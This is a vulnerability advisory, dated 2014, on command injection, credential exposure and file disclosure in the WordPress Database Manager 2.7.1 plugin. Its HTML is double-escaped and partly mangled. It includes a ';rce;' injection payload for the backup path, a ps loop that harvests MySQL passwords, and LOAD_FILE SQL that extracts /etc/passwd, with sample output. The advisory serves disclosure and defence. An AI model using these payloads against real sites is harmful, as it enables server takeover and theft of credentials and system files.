<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title></title>
<meta name="generator" content="HTML::TextToHTML v2.51"/>
</head>
<body>
<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
    white-space: -moz-pre-wrap; /</em> Firefox <em>/
    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
    white-space: -o-pre-wrap;   /</em> Opera 7 */
    word-wrap: break-word;<br/>
}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 113&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Vulnerabilities in WordPress Database Manager v2.7.1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2014-10-13&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wp-dbmanager/">https://wordpress.org/plugins/wp-dbmanager/</a>"&gt;<a href="https://wordpress.org/plugins/wp-dbmanager/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wp-dbmanager/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt; Lester Chan, <a href="https://profiles.wordpress.org/gamerz/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/gamerz/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2014-10-13&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:lesterchan@gmail.com">lesterchan@gmail.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Allows you to optimize database, repair database, backup database, restore database, delete backup database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and repairing of database.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;Plugin suffers from command injection, exposes MySQL database credentials to the process table and allows the user to download system files via the &amp;lsquo;Run SQL Query&amp;rsquo; feature. User authentication with current_user_can(&amp;#039;manage_database&amp;#039;)) privileges are required.
</p><p>The command that is sent through passthru() is the following:
/usr/bin/mysqldump --force --host=&amp;quot;localhost&amp;quot; --user=&amp;quot;root&amp;quot; --password=&amp;quot;passwordhere&amp;quot;
--default-character-set=&amp;quot;utf8&amp;quot; --add-drop-table --skip-lock-tables wordpress &amp;gt; /usr/share/wordpress/wp-content/backup-db\&amp;#039;;rce;\&amp;#039;/1413225588_-<u>wordpress.sql
rce is just a homebrew .c binary I wrote for testing command injections it creates a file
in /tmp with some stats on who executed it.
<strong> cat /tmp/RCE</u>JChl9c<br/>
ARGGHHH I&amp;</strong>039;ve been executed! my pid is :16169 Parent id 16168
</p><pre>
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33</pre>
<p>In the following lines commands can be injected into the variables being used to build
the command by using ;command;<br/>
$backup[&amp;#039;filepath&amp;#039;]<br/>
$backup[&amp;#039;mysqldumppath&amp;#039;]<br/>
I use $backup[&amp;lsquo;filepath&amp;rsquo;] or &amp;ldquo;Path To Backup:&amp;rdquo;  for my PoC.
/usr/share/wordpress/wp-content/backup-db;rce;
Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:
/usr/bin/mysqldump --force --host=&amp;quot;localhost&amp;quot; --user=&amp;quot;root&amp;quot; --password=&amp;quot;passwordhere&amp;quot;
--default-character-set=&amp;quot;utf8&amp;quot; --add-drop-table --skip-lock-tables wordpress &amp;gt; /usr/share/wordpress/wp-content/backup-db;rce;/1413225588_-<u>wordpress.sql
rce is just a homebrew .c binary I wrote for testing command injections, it creates a file
in /tmp with some stats on who executed it.  
<strong> cat /tmp/RCE</u>JChl9c<br/>
ARGGHHH I&amp;</strong>039;ve been executed! my pid is :16169 Parent id 16168
</p><pre>
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33
</pre>
<p>Mysql Credentials Leaked to Process Table
</p><p>Also by running a simple script:<br/>
PoC:<br/>
 $ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done
6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host=&amp;quot;localhost&amp;quot; --user=&amp;quot;root&amp;quot; --password=&amp;quot;passwordhere&amp;quot; --default-character-set=&amp;quot;utf8&amp;quot; --add-drop-table --skip-lock-tables wordpress &amp;gt; /usr/share/wordpress/wp-content/backup-db/1413224776_-<u>wordpress.sql 6328 ? R 0:00 sh -c /usr/bin/mysqldump --force --host=&amp;quot;localhost&amp;quot; --user=&amp;quot;root&amp;quot; --password=&amp;quot;passwordhere&amp;quot; --default-character-set=&amp;quot;utf8&amp;quot; --add-drop-table --skip-lock-tables wordpress &amp;gt; /usr/share/wordpress/wp-content/backup-db/1413224776</u>-<u>wordpress.sql6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host=&amp;quot;localhost&amp;quot; --user=&amp;quot;root&amp;quot; --password=&amp;quot;passwordhere&amp;quot; --default-character-set=&amp;quot;utf8&amp;quot; --add-drop-table --skip-lock-tables wordpress &amp;gt; /usr/share/wordpress/wp-content/backup-db/1413224776</u>-<u>wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host=&amp;quot;localhost&amp;quot; --user=&amp;quot;root&amp;quot; --password=&amp;quot;passwordhere&amp;quot; --default-character-set=&amp;quot;utf8&amp;quot; --add-drop-table --skip-lock-tables wordpress &amp;gt; /usr/share/wordpress/wp-content/backup-db/1413224776</u>-_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress
A malicious local user can harvest credentials for the mysql database off the process table.
The trouble is the code doesn&amp;rsquo;t properly sanitize user input and is being passed directly to passthru or system depending on which OS you&amp;rsquo;re using.
</p><pre>
     In <a href="ftp://wp-dbmanager.php/86">wp-dbmanager.php:86</a>
                         $backup[&amp;#039;command&amp;#039;] = &amp;#039;&amp;#039;;
     87                 $brace = (substr(PHP_OS, 0, 3) == &amp;#039;WIN&amp;#039;) ? &amp;#039;&amp;quot;&amp;#039; : &amp;#039;&amp;#039;;
     88                 if(intval($backup_options[&amp;#039;backup_gzip&amp;#039;]) == 1) {
     89                         $backup[&amp;#039;filename&amp;#039;] = $backup[&amp;#039;date&amp;#039;].&amp;#039;_-<u>&amp;#039;.DB</u>NAME.&amp;#039;.sql.gz&amp;#039;;
     90                         $backup[&amp;#039;filepath&amp;#039;] = $backup[&amp;#039;path&amp;#039;].&amp;#039;/&amp;#039;.$backup[&amp;#039;filename&amp;#039;];
     91                         $backup[&amp;#039;command&amp;#039;] = $brace.$backup[&amp;#039;mysqldumppath&amp;#039;].$brace.&amp;#039; --force --host=&amp;quot;&amp;#039;.$backup[&amp;#039;host&amp;#039;].&amp;#039;&amp;quot; --user=&amp;quot;&amp;#039;.DB_USER.&amp;#039;&amp;quot; --password=&amp;quot;&amp;#039;.$backup[&amp;#039;password&amp;#039;].&amp;#039;&amp;quot;&amp;#039;.$backup[&amp;#039;port&amp;#039;].$backup[&amp;#039;sock&amp;#039;].&amp;#039; --add-drop-table --skip-lock-tables &amp;#039;.DB_NAME.&amp;#039; | gzip &amp;gt; &amp;#039;.$brace.$backup[&amp;#039;filepath&amp;#039;].$brace;
     92                 } else {
     93                         $backup[&amp;#039;filename&amp;#039;] = $backup[&amp;#039;date&amp;#039;].&amp;#039;_-<u>&amp;#039;.DB</u>NAME.&amp;#039;.sql&amp;#039;;
     94                         $backup[&amp;#039;filepath&amp;#039;] = $backup[&amp;#039;path&amp;#039;].&amp;#039;/&amp;#039;.$backup[&amp;#039;filename&amp;#039;];
     95                         $backup[&amp;#039;command&amp;#039;] = $brace.$backup[&amp;#039;mysqldumppath&amp;#039;].$brace.&amp;#039; --force --host=&amp;quot;&amp;#039;.$backup[&amp;#039;host&amp;#039;].&amp;#039;&amp;quot; --user=&amp;quot;&amp;#039;.DB_USER.&amp;#039;&amp;quot; --password=&amp;quot;&amp;#039;.$backup[&amp;#039;password&amp;#039;].&amp;#039;&amp;quot;&amp;#039;.$backup[&amp;#039;port&amp;#039;].$backup[&amp;#039;sock&amp;#039;].&amp;#039; --add-drop-table --skip-lock-tables &amp;#039;.DB_NAME.&amp;#039; &amp;gt; &amp;#039;.$brace.$backup[&amp;#039;filepath&amp;#039;].$brace;
     96                 }
     97                 execute_backup($backup[&amp;#039;command&amp;#039;]);
</pre>
   
<p>    211 ##<strong> Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)
    212 function execute_backup($command) {
</p><pre>
    213         $backup_options = get_option(&amp;</strong>039;dbmanager_options&amp;#039;);
    214         check_backup_files();
    215         if(substr(PHP_OS, 0, 3) == &amp;#039;WIN&amp;#039;) {
    216                 $writable_dir = $backup_options[&amp;#039;path&amp;#039;];
    217                 $tmpnam = $writable_dir.&amp;#039;/wp-dbmanager.bat&amp;#039;;
    218                 $fp = fopen($tmpnam, &amp;#039;w&amp;#039;);
    219                 fwrite($fp, $command);
    220                 fclose($fp);
    221                 system($tmpnam.&amp;#039; &amp;gt; NUL&amp;#039;, $error);
    222                 unlink($tmpnam);
    223         } else {
    224                 passthru($command, $error);
    225         }
    226         return $error;
</pre>
<p>    227 }<br/>
In database-manage.php:
</p><pre>
        46                                 if(stristr($database_file, &amp;#039;.gz&amp;#039;)) {
     47                                         $backup[&amp;#039;command&amp;#039;] = &amp;#039;gunzip &amp;lt; &amp;#039;.$brace.$backup[&amp;#039;path&amp;#039;].&amp;#039;/&amp;#039;.$database_file.$brace.&amp;#039; | &amp;#039;.$brace.$backup[&amp;#039;mysqlpath&amp;#039;].$brace.&amp;#039; --host=&amp;quot;&amp;#039;.$backup[&amp;#039;host&amp;#039;].&amp;#039;&amp;quot; --user=&amp;quot;&amp;#039;.DB_USER.&amp;#039;&amp;quot; --password=&amp;quot;&amp;#039;.$backup[&amp;#039;password&amp;#039;].&amp;#039;&amp;quot;&amp;#039;.$backup[&amp;#039;port&amp;#039;].$backup[&amp;#039;sock&amp;#039;].$backup[&amp;#039;charset&amp;#039;].&amp;#039; &amp;#039;.DB_NAME;
     48                                 } else {
     49                                         $backup[&amp;#039;command&amp;#039;] = $brace.$backup[&amp;#039;mysqlpath&amp;#039;].$brace.&amp;#039; --host=&amp;quot;&amp;#039;.$backup[&amp;#039;host&amp;#039;].&amp;#039;&amp;quot; --user=&amp;quot;&amp;#039;.DB_USER.&amp;#039;&amp;quot; --password=&amp;quot;&amp;#039;.$backup[&amp;#039;password&amp;#039;].&amp;#039;&amp;quot;&amp;#039;.$backup[&amp;#039;port&amp;#039;].$backup[&amp;#039;sock&amp;#039;].$backup[&amp;#039;charset&amp;#039;].&amp;#039; &amp;#039;.DB_NAME.&amp;#039; &amp;lt; &amp;#039;.$brace.$backup[&amp;#039;path&amp;#039;].&amp;#039;/&amp;#039;.$database_file.$brace;
     50                                 }
     51                                 passthru($backup[&amp;#039;command&amp;#039;], $error);
</pre>
<p>File Downloads
</p><p>In the &amp;lsquo;Sql Run Query&amp;rsquo; Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER statements.) but these are suffiecient to download sensitive system files:
CREATE TABLE password (passwords varchar(8096));
INSERT into password (passwords) VALUES(LOAD_FILE(&amp;lsquo;/etc/passwd&amp;rsquo;));
Then run a database backup, and download the backup file or send via email.
From 1413409573_-_wordpress.sql:<br/>
INSERT INTO `password` VALUES (&amp;#039;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\n<a href="news:x">news:x</a>:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nDebian-exim:x:101:104::/var/spool/exim4:/bin/false\nstatd:x:102:65534::/var/lib/nfs:/bin/false\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\npostgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nlarry:x:1000:1000:larry,,,:/home/larry:/bin/bash\nmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\n&amp;#039;);
/*!40000 ALTER TABLE `password` ENABLE KEYS */;
&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2014-8334 2014-8335&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=113"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; [&lt;a href="/m/imageles0.png"&gt;imageles0.png&lt;/a&gt;][&lt;a href="/m/imageles1.png"&gt;imageles1.png&lt;/a&gt;]&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/">http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
&lt;/html&gt;
</p>

</body>
</html>
